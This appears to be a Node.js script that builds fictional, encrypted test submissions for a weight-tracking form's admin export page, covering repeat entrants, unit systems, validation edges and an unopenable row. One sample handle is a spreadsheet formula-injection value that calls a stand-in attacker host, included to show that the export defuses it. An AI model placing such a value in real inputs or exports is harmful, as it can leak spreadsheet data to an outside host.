/*
 * Builds dev/sample-submissions.json - disposable test data for
 * admin.html and its dashboard.
 *
 *     node dev/make-sample.mjs
 *
 * Why this exists: admin.html and the dashboard were the only parts of
 * this project with no repeatable way to exercise them. Every test of
 * them meant hand-building fake rows in a browser console and stubbing
 * fetch, differently each time, gone the moment the tab closed. And
 * anyone inheriting this project could not see the export working
 * without pointing it at real submissions, which is the one thing they
 * should not have to do.
 *
 * DO NOT CONFUSE THIS WITH dev/fixture.json. They are opposites:
 *
 *   fixture.json        proves the wire format still decrypts.
 *                       NEVER regenerate it - see dev/README.md.
 *   sample-*.json       disposable. Regenerate it freely, and do
 *                       regenerate it whenever the record shape changes.
 *
 * That is why this is a script and not a hand-written file. A sample
 * typed out by hand is a second opinion about what a record looks like,
 * free to drift from the one the form actually produces - so the
 * records here are built by the real apps/web/form.js and sealed by the
 * real apps/web/crypto.js, to dev/test-key.json's throwaway public
 * half. Nothing real is involved at any point.
 *
 * The output is shaped exactly like the Worker's GET /export reply, so
 * it drops into admin.html with no translation. dev/README.md has the
 * console snippet. There is deliberately no ?sample= hook or any other
 * dev branch in apps/web - that directory is published verbatim, and a
 * code path that loads fake data into the export page is not something
 * to ship to a live site.
 */
import { readFile, writeFile } from "node:fs/promises";
import { fileURLToPath } from "node:url";

const HERE = (p) => fileURLToPath(new URL(p, import.meta.url));

const load = async (path) => {
  const src = await readFile(HERE(path), "utf8");
  await import("data:text/javascript," + encodeURIComponent(src));
};

await load("../apps/web/form.js");
await load("../apps/web/crypto.js");

const { buildRecord, validate } = globalThis.BinderForm;
const { encrypt } = globalThis.BinderCrypto;

const keyFile = JSON.parse(await readFile(HERE("test-key.json"), "utf8"));

/* ------------------------------------------------------------------ */
/* The people.                                                         */

/*
 * A readable table, because the point of this file is that someone can
 * see what the sample covers without decrypting it. Each row is one
 * submission as the form collected it, plus two things the form does not
 * put in that object: `at`, the moment it was sent, and `telegram`, the
 * person it came from.
 *
 * `telegram` sits inside the row rather than beside it because three
 * separate things read it, and they want it in the same place:
 * validate() below checks it as unverified input, buildRecord is handed
 * it as the verified session username the live page takes from the
 * session instead, and the person-count at the bottom normalizes it.
 * Naming it `sessionUsername` to match readForm() would satisfy one of
 * those three and blind the other two - validate() would see no handle
 * at all and reject every row here.
 *
 * Every row here is deliberate. The branches they exercise are named in
 * dev/README.md; the short version is that each of these is otherwise
 * only reachable by luck:
 *
 *   - repeat submitters, so weight-over-time has something to draw
 *   - a height that changes between entries, for the data-quality panel
 *   - blanks in every optional field
 *   - both unit systems, including imperial with the inches box empty
 *   - a handle that a spreadsheet would execute
 *   - a row encrypted to a key nobody here holds
 *   - the top and bottom of every validation range
 */
const SAMPLE = [
  /*
   * Four entries over five months, gaining throughout. The steady case
   * the weight-over-time chart is for.
   */
  {
    at: "2026-03-02T09:14:00.000Z",
    telegram: "@BigBearBenny", units: "metric",
    weightKg: "118", heightCm: "183",
    gender: "male", roles: ["gainer", "feedee"], country: "US", over18: true,
  },
  {
    at: "2026-04-06T09:02:00.000Z",
    telegram: "bigbearbenny", units: "metric",
    weightKg: "124.5", heightCm: "183",
    gender: "male", roles: ["gainer", "feedee"], country: "US", over18: true,
  },
  {
    at: "2026-05-11T20:41:00.000Z",
    telegram: "bigbearbenny", units: "metric",
    weightKg: "131", heightCm: "183",
    gender: "male", roles: ["gainer", "feedee"], country: "US", over18: true,
  },
  {
    at: "2026-07-19T11:05:00.000Z",
    telegram: "bigbearbenny", units: "metric",
    weightKg: "139.5", heightCm: "183",
    gender: "male", roles: ["gainer", "feedee", "admirer"], country: "US",
    over18: true,
  },

  /*
   * Three entries in imperial, and her height gains two inches between
   * the second and the third. Height does not change in adults, so the
   * data-quality panel should name her: this is what a typo, a unit
   * mix-up or two people sharing a handle all look like from here.
   */
  {
    at: "2026-04-15T18:30:00.000Z",
    telegram: "t.me/roundrobin_ok", units: "imperial",
    weightLb: "212", heightFeet: "5", heightInches: "6",
    gender: "female", roles: ["feedee"], country: "GB", over18: true,
  },
  {
    at: "2026-06-01T19:12:00.000Z",
    telegram: "roundrobin_ok", units: "imperial",
    weightLb: "228.5", heightFeet: "5", heightInches: "6",
    gender: "female", roles: ["feedee"], country: "GB", over18: true,
  },
  {
    at: "2026-07-28T08:55:00.000Z",
    telegram: "roundrobin_ok", units: "imperial",
    weightLb: "241", heightFeet: "5", heightInches: "8",
    gender: "female", roles: ["feedee", "gainer"], country: "GB", over18: true,
  },

  /*
   * Two entries, losing rather than gaining - the chart must not assume
   * a direction.
   */
  {
    at: "2026-05-20T13:00:00.000Z",
    telegram: "quietfeeder_mx", units: "metric",
    weightKg: "96", heightCm: "171",
    gender: "nonbinary", roles: ["feeder"], country: "MX", over18: true,
  },
  {
    at: "2026-07-30T13:44:00.000Z",
    telegram: "quietfeeder_mx", units: "metric",
    weightKg: "91.2", heightCm: "171",
    gender: "nonbinary", roles: ["feeder"], country: "MX", over18: true,
  },

  /*
   * Every optional field left alone. `Not stated` is a bar on the
   * charts rather than a deletion - see DESIGN.md, "Two smaller
   * judgements" - and this is the row that proves it.
   */
  {
    at: "2026-06-11T22:07:00.000Z",
    telegram: "no_details_here", units: "imperial",
    weightLb: "187", heightFeet: "5", heightInches: "11",
    gender: "", roles: [], country: "", over18: true,
  },

  /*
   * Imperial with the inches box empty, which means a round number of
   * feet rather than an error. Settled in DESIGN.md under the imperial
   * height question, and held by dev/form.test.mjs; here so the sample
   * shows what it writes down - `entered` reads "6 ft 0 in".
   */
  {
    at: "2026-06-18T07:21:00.000Z",
    telegram: "roundfeet_only", units: "imperial",
    weightLb: "203", heightFeet: "6", heightInches: "",
    gender: "other", roles: ["admirer"], country: "CA", over18: true,
  },

  /*
   * A single entry, so the weight-over-time chart must leave them out.
   * One point is not a trend, and drawing it as a line implies a
   * history that does not exist.
   */
  {
    at: "2026-07-02T16:38:00.000Z",
    telegram: "just_the_once", units: "metric",
    weightKg: "104.4", heightCm: "168",
    gender: "female", roles: ["admirer"], country: "DE", over18: true,
  },

  /*
   * The bottom and the top of every validation range, in both systems.
   * These are the rows that find an axis that cannot cope, a histogram
   * whose last bin drops its own edge, or a BMI that divides by
   * something it should not.
   */
  {
    at: "2026-07-05T10:00:00.000Z",
    telegram: "edge_low_metric", units: "metric",
    weightKg: "20", heightCm: "100",
    gender: "other", roles: [], country: "NL", over18: true,
  },
  {
    at: "2026-07-06T10:00:00.000Z",
    telegram: "edge_high_metric", units: "metric",
    weightKg: "500", heightCm: "250",
    gender: "male", roles: ["feedee"], country: "PL", over18: true,
  },
  {
    at: "2026-07-07T10:00:00.000Z",
    telegram: "edge_low_imperial", units: "imperial",
    weightLb: "44", heightFeet: "3", heightInches: "0",
    gender: "female", roles: [], country: "ES", over18: true,
  },
  {
    at: "2026-07-08T10:00:00.000Z",
    telegram: "edge_high_imperial", units: "imperial",
    weightLb: "1100", heightFeet: "8", heightInches: "11",
    gender: "nonbinary", roles: ["gainer"], country: "IT", over18: true,
  },

  /*
   * A handle a spreadsheet would execute rather than display.
   *
   * The form's own validation rejects this - Telegram handles are
   * letters, digits and underscores - so `expect: "invalid"` below says
   * so, and this row skips the validation check on purpose. That is
   * exactly the point: a record is whatever arrived, and this design
   * assumes the submitter's browser is the submitter's, not that it ran
   * our JavaScript. admin.js defuses the cell with a leading
   * apostrophe; this is the row that shows it working.
   */
  {
    at: "2026-07-12T14:26:00.000Z",
    expect: "invalid",
    telegram: '=HYPERLINK("http://evil.example/"&A1,"click")', units: "metric",
    weightKg: "88", heightCm: "175",
    gender: "male", roles: ["feeder"], country: "FR", over18: true,
  },

  /*
   * Encrypted to a keypair generated fresh in this script and then
   * dropped, so nothing can ever open it. This is the rotated-key case
   * - old rows that predate the current key - and it is the branch most
   * likely to be wrong on the day it matters. admin.html must list it
   * by id under "Rows that would not open" and export every other row
   * regardless.
   */
  {
    at: "2026-07-25T09:30:00.000Z",
    wrongKey: true,
    telegram: "sealed_to_nobody", units: "metric",
    weightKg: "112", heightCm: "180",
    gender: "male", roles: ["gainer"], country: "SE", over18: true,
  },
];

/* ------------------------------------------------------------------ */
/* Building it.                                                        */

/*
 * The sample must be data the form could actually have produced,
 * otherwise it tests the export against a shape that never arrives.
 * Anything not marked `expect: "invalid"` is put through the real
 * validate() and this script refuses to write a file if it fails.
 */
const rejected = [];
for (const row of SAMPLE) {
  /*
   * One argument on purpose, where buildRecord below gets the handle as
   * a third. validate()'s two-argument form treats the handle as already
   * verified by Telegram and skips the local HANDLE pattern - so passing
   * it here would make the `expect: "invalid"` row come back accepted,
   * and this loop would report the table as wrong. The one-argument form
   * is the unverified-input contract, and an unverified spreadsheet
   * formula is the entire point of that row.
   */
  const problems = validate(row);
  if (row.expect === "invalid") {
    if (!problems.length) {
      rejected.push(row.telegram + ": marked invalid but the form accepts it");
    }
  } else if (problems.length) {
    rejected.push(row.telegram + ": " + problems.map((p) => p.message).join(" "));
  }
}
if (rejected.length) {
  console.error("The sample table does not match what the form accepts:\n");
  for (const problem of rejected) console.error("  " + problem);
  console.error(
    "\nFix the table above, not this check - a sample the form could not " +
    "have produced tests nothing.");
  process.exit(1);
}

/*
 * A throwaway recipient for the one unopenable row. Generated here and
 * never written down: a key nobody holds is the honest way to produce a
 * row nobody can open, and it means this script has no second key file
 * to keep in step.
 */
async function unopenablePublicKey() {
  const pair = await crypto.subtle.generateKey(
    { name: "ECDH", namedCurve: "P-256" }, true, ["deriveBits"]);
  const raw = new Uint8Array(
    await crypto.subtle.exportKey("raw", pair.publicKey));
  let binary = "";
  for (const byte of raw) binary += String.fromCharCode(byte);
  return btoa(binary);
}

const lostKey = await unopenablePublicKey();

/*
 * Ordered by `at` and numbered from 1, because that is what an
 * append-only table looks like: the Worker returns `ORDER BY id`, and
 * ids follow the order things arrived.
 *
 * `received_at` is a few seconds after `submittedAt` - the client's
 * clock and the server's receipt are two different timestamps, and the
 * export keeps both. Making them identical here would hide a column
 * that exists precisely because they can disagree.
 */
const ordered = SAMPLE.slice().sort(
  (a, b) => Date.parse(a.at) - Date.parse(b.at));

const submissions = [];
let id = 0;
for (const row of ordered) {
  const submittedAt = Date.parse(row.at);
  /*
   * The third argument is the verified session username, which the live
   * page takes from the Worker's session; buildRecord refuses to build a
   * record without one rather than falling back to anything a member can
   * type. Here the row's own handle plays that part, which is what keeps
   * the three spellings of one person in the table above meaningful -
   * normalizeTelegram folds them together, and the count at the bottom
   * of this file is the assertion that it did.
   */
  const record = buildRecord(row, submittedAt, row.telegram);
  const ciphertext = await encrypt(
    record, row.wrongKey ? lostKey : keyFile.publicKey);
  submissions.push({
    id: ++id,
    ciphertext: ciphertext,
    received_at: new Date(submittedAt + 4200).toISOString(),
  });
}

/*
 * Shaped exactly like GET /export, so admin.html needs no translation
 * and the stub in dev/README.md is three lines.
 */
const payload = {
  ok: true,
  generated: new Date().toISOString(),
  note: "Sample data from dev/make-sample.mjs. Encrypted to the throwaway " +
    "key in dev/test-key.json. Nothing here is real, and regenerating it " +
    "is safe - unlike dev/fixture.json.",
  submissions: submissions,
};

await writeFile(
  HERE("sample-submissions.json"), JSON.stringify(payload, null, 2) + "\n");

// Normalized before counting, or the three spellings of one handle in
// the table above would be reported as three people.
const people = new Set(
  SAMPLE.map((row) => globalThis.BinderForm.normalizeTelegram(row.telegram))
).size;
console.log(
  "dev/sample-submissions.json written - " + submissions.length +
  " row(s), " + people + " handle(s), 1 unopenable.");
console.log("Load it into admin.html with the snippet in dev/README.md.");
